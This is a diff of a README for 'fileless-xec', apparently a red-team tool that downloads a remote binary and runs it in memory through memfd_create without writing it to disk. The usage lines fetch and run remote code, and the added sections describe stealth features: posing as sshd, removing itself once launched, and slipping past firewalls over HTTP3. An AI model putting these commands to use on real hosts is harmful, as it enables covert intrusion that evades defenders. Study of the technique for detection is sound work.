@@ -13,9 +13,8 @@
 
 `fileless-xec` enable us to execute a remote binary on a local machine in one step without dropping them on disk
 
- - simple usage `fileless-xec <binary_url>`
+ - simple usage `fileless-xec <binary_url>` (~`curl | sh` for binaries)
  - execute binary with specified program name: `fileless-xec -n /usr/sbin/sshd <binary_raw_url>`
- - retrieve remote binary using http3 protocol and execute it: `fileless-xec -http3 <binary_raw_url>`
  - detach program execution from `tty`: ` setsid fileless-xec [...]` 
 
 ![demo](https://github.com/ariary/fileless-xec/blob/main/img/curlNexec.gif)
@@ -29,11 +28,24 @@ Locally we use <code>fileless-xec</code> and impersonate the <code>/usr/sbin/ssh
 
 </details>
 
+### Other use cases
+
+* Execute binary with stdout/stdin
+* Execute binary with arguments
+* `fileless-xec` self remove
+* "Remote go": execute go binaries without having go installed locally
+* Bypass firewall with HTTP3
+* Execute a shell script
+* `fileless-xec` server mode
+* `fileless-xec` on windows
+
+
 ## Stealthiness story
 
 * The binary file is not mapped into the host file system
 * The execution program name could be customizable
 * Bypass 3rd generation firewall could be done with http3 support
+* `fileless-xec` self removes once launched
 
 ### memfd_create
 The remote binary file is stored locally using `memfd_create` syscall, which store it within a _memory disk_ which is not mapped into the file system (*ie* you can't find it using `ls`).
